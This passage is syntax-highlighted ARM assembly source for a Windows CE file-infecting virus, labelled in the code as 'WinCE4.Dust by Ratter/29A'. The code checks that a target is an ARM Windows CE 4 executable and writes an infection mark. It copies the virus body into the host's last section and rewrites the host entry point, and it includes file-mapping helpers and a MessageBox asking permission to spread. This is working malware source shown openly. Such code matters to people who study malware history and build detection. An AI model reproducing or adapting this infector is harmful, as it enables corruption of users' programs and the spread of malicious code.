   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x24</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get old section flags</span><span class="sc0">
   </span><span class="sc5">orr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">      </span><span class="sc1">; or it with our needed ones</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r10</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x24</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; store new flags</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x72617461</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x4c</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; store our infection mark</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">      </span><span class="sc1">; now we'll copy virus body</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">        </span><span class="sc1">; to space prepared in last section</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r7</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">simple_memcpy</span><span class="sc0">

   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">host_ep</span><span class="sc0">      </span><span class="sc1">; compute number of bytes between</span><span class="sc0">
                   </span><span class="sc1">; virus start and host ep</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">      </span><span class="sc1">; because we'll store new host_ep</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r9</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; in the copied virus body</span><span class="sc0">

</span><span class="sc5">infect_file_end_unmap_view</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">        </span><span class="sc1">; unmap the view</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">infect_file_end_close_mapping</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">        </span><span class="sc1">; close the mapping</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">infect_file_end_close_file</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">        </span><span class="sc1">; close file handle</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">infect_file_end</span><span class="sc0">
   </span><span class="sc5">ldmia</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}   </span><span class="sc1">; and return</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; a little reminiscence of my beloved book - Greg Egan's Permutation City</span><span class="sc0">
   </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"This code arose from the dust of Permutation City"</span><span class="sc0">
   </span><span class="sc9">ALIGN</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">


   </span><span class="sc1">; this function checks whether the file we want to infect is</span><span class="sc0">
   </span><span class="sc1">; suitable</span><span class="sc0">
</span><span class="sc5">check_header</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r5</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x5a4d</span><span class="sc0">      </span><span class="sc1">; MZ?</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">infect_file_end_close_mapping</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x3c</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">

   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x4550</span><span class="sc0">      </span><span class="sc1">; Signature == PE?</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">check_header_end</span><span class="sc0">

   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x1c0</span><span class="sc0">      </span><span class="sc1">; Machine == ARM?</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">check_header_end</span><span class="sc0">

   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x5C</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; IMAGE_SUBSYSTEM_WINDOWS_CE_GUI ?</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">9</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">check_header_end</span><span class="sc0">

   </span><span class="sc5">ldrh</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x40</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; windows ce 4?</span><span class="sc0">

</span><span class="sc5">check_header_end</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; r0 - file</span><span class="sc0">
</span><span class="sc5">open_file</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">!

   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0xc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; OPEN_EXISTING</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; GENERIC_READ | GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; call CreateFileForMappingW to</span><span class="sc0">
                   </span><span class="sc1">; get the handle suitable for</span><span class="sc0">
                   </span><span class="sc1">; CreateFileMapping API</span><span class="sc0">
                   </span><span class="sc1">; (on Win32 calling CreateFile is enough)</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0xc</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; r0 - max size low</span><span class="sc0">
</span><span class="sc5">create_mapping</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">!

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">8</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">; r0 - bytes to map</span><span class="sc0">
</span><span class="sc5">map_file</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">!

   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">6</span><span class="sc0">        </span><span class="sc1">; FILE_MAP_READ or FILE_MAP_WRITE</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">


   </span><span class="sc1">; not optimized (thus simple) mem copy</span><span class="sc0">
</span><span class="sc1">; r0 - src</span><span class="sc0">
</span><span class="sc1">; r1 - dst</span><span class="sc0">
</span><span class="sc1">; r2 - how much</span><span class="sc0">
</span><span class="sc5">simple_memcpy</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r1</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">subs</span><span class="sc0">   </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">simple_memcpy</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">


   </span><span class="sc1">; (r1 - (r1 % r0)) + r0</span><span class="sc0">
</span><span class="sc1">; r0 - number to align</span><span class="sc0">
</span><span class="sc1">; r1 - align to what</span><span class="sc0">
</span><span class="sc5">_align_</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">stmdb</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">}

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">

   </span><span class="sc1">; ARM ISA doesn't have the div instruction so we'll have to call</span><span class="sc0">
   </span><span class="sc1">; the coredll's div implementation</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; udiv</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc0">

   </span><span class="sc5">ldmia</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; this function will ask user (via a MessageBox) whether we're</span><span class="sc0">
   </span><span class="sc1">; allowed to spread or not</span><span class="sc0">
</span><span class="sc5">ask_user</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">!

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">text</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">caption</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">7</span><span class="sc0">

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">sp</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; notice that the strings are encoded in UNICODE</span><span class="sc0">

   </span><span class="sc1">; WinCE4.Dust by Ratter/29A</span><span class="sc0">
</span><span class="sc5">caption</span><span class="sc0"> </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"W"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"i"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"n"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"C"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"4"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"D"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"u"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"s"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"t"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"b"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"y"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"R"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"t"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
